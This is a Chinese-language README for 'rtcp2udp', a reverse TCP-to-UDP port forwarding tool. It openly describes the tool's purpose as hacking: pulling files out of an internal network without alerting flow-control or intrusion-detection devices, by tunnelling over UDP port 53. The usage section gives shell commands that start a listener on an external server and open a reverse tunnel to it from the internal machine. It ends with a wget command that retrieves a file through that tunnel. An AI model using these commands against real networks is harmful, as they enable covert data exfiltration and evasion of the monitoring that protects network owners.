# rtcp2udp
反向端口转发工具 v 1.0  
Reverse TCP Port to UDP Forwarding Tools  
  
Last Update: 2016年04月29日  
问题反馈: ringzero@0x557.org  

## 更稳定的方法
[一个稳定的UDP反向端口映射方法](https://github.com/ring04h/rtcp2udp/blob/master/udptunnel.md)  

## 实例图
![](https://github.com/ring04h/rtcp2udp/blob/master/portmap.png?20160429)  

## 描述
在Hack场景中，Hack人员需要从内网获取指定文件，并向外网传输时，不被流控设备，入侵检测设备所警觉；  
本工具的原理为，向外网服务器建立一个反向的UDP(53)隧道,用于文件传输；  

## 网络传输流程
外网客户端连接 119.29.29.29 的80端口，等于连接内网 172.168.1.10 服务器的80端口，隧道采用UDP协议传输  

## 使用说明
Http Server  <- 内网机器 -> Internet Server (UDP隧道)  
Client -> tcp:119.29.29.29:80 -> udp:119.29.29.29:53 -> tcp:172.168.1.10:80

* 在你的外网服务器监听用于服务的 UDP&TCP 端口
这里假设场景,你的外网服务器 IP 为 119.29.29.29
```shell
[root@localhost ~]# python tcp2udp.py -t 0.0.0.0:80 -u 0.0.0.0:53
[INFO] UDPServer 0.0.0.0:53 Listening Success...
[INFO] TCPServer 0.0.0.0:80 Listening Success...
```
* 在内网机器打通与外网服务器之间的 UDP 隧道
```shell
[root@localhost ~]# python rtcp2udp.py -t 172.168.1.10:80 -u 119.29.29.29:53
[INFO] Client Bridge Connection Success...
```
* 当隧道打通后，就可以开始文件传输服务
```shell
[root@localhost ~]# wget http://119.29.29.29/src/file.tar.gz
```

